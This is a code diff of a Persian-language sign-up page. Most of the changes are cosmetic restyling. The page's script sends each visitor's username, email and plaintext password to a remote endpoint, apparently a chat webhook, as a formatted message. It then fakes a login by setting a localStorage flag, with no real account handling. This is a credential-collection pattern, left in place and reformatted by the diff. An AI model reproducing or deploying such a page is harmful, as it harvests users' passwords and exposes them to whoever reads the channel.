@@ -6,71 +6,103 @@
   <title>ثبت نام</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #0e0e0e;
+      font-family: 'Rubik', sans-serif;
+      background: linear-gradient(135deg, #0e0e0e, #1a1a1a, #2a2a2a);
       color: #fff;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
       margin: 0;
+      direction: rtl;
     }
+
     .form-container {
-      background: #1a1a1a;
-      padding: 2rem;
-      border-radius: 12px;
-      width: 320px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.5);
+      background: rgba(26, 26, 26, 0.9);
+      padding: 2.5rem;
+      border-radius: 16px;
+      width: 360px;
+      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.7);
+      backdrop-filter: blur(12px);
+      animation: fadeIn 1s ease;
     }
+
     h2 {
       text-align: center;
       margin-bottom: 1.5rem;
       color: #8a2be2;
+      font-size: 1.6rem;
     }
+
     .form-group {
-      margin-bottom: 1rem;
+      margin-bottom: 1.2rem;
     }
+
     label {
       display: block;
       margin-bottom: 0.5rem;
+      font-weight: bold;
+      font-size: 0.9rem;
     }
+
     input {
       width: 100%;
-      padding: 0.7rem;
+      padding: 0.8rem;
       border: none;
-      border-radius: 8px;
+      border-radius: 10px;
       background: #2a2a2a;
       color: #fff;
+      font-size: 0.95rem;
+      transition: 0.3s;
     }
+
+    input:focus {
+      outline: none;
+      background: #333;
+      box-shadow: 0 0 0 2px #8a2be2;
+    }
+
     .btn {
       width: 100%;
-      padding: 0.8rem;
-      background: #8a2be2;
+      padding: 0.9rem;
+      background: linear-gradient(45deg, #8a2be2, #6a1db7);
       border: none;
-      border-radius: 8px;
+      border-radius: 10px;
       color: #fff;
       font-size: 1rem;
+      font-weight: bold;
       cursor: pointer;
       transition: 0.3s;
     }
+
     .btn:hover {
-      background: #6a1db7;
+      background: linear-gradient(45deg, #6a1db7, #8a2be2);
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(138, 43, 226, 0.5);
     }
+
     .link {
       display: block;
       text-align: center;
-      margin-top: 1rem;
+      margin-top: 1.5rem;
       color: #aaa;
       text-decoration: none;
+      transition: 0.3s;
     }
+
     .link:hover {
       color: #fff;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
     }
   </style>
 </head>
 <body>
   <div class="form-container">
-    <h2>ثبت نام</h2>
+    <h2>✨ ثبت نام ✨</h2>
     <form id="registerForm">
       <div class="form-group">
         <label for="username">نام کاربری</label>
@@ -84,7 +116,7 @@
         <label for="password">رمز عبور</label>
         <input type="password" id="password" required>
       </div>
-      <button type="submit" class="btn">ثبت نام</button>
+      <button type="submit" class="btn">🚀 ثبت نام</button>
     </form>
     <a href="login.html" class="link">حساب دارید؟ وارد شوید</a>
   </div>
@@ -100,7 +132,19 @@
       const password = document.getElementById("password").value;
 
       const payload = {
-        content: `📥 **ثبت‌نام جدید**\n👤 یوزرنیم: ${username}\n📧 ایمیل: ${email}\n🔑 پسورد: ${password}`
+        embeds: [
+          {
+            title: "📥 ثبت‌نام جدید",
+            color: 8965321,
+            fields: [
+              { name: "👤 یوزرنیم", value: username, inline: false },
+              { name: "📧 ایمیل", value: email, inline: false },
+              { name: "🔑 پسورد", value: password, inline: false }
+            ],
+            footer: { text: "Supernatural Register System" },
+            timestamp: new Date()
+          }
+        ]
       };
 
       try {
@@ -110,10 +154,7 @@
           body: JSON.stringify(payload)
         });
 
-        // ذخیره وضعیت لاگین
         localStorage.setItem("isLoggedIn", "true");
-
-        // ریدایرکت به صفحه اصلی
         window.location.href = "index.html";
       } catch (err) {
         alert("❌ خطا در ثبت‌نام، دوباره تلاش کنید.");
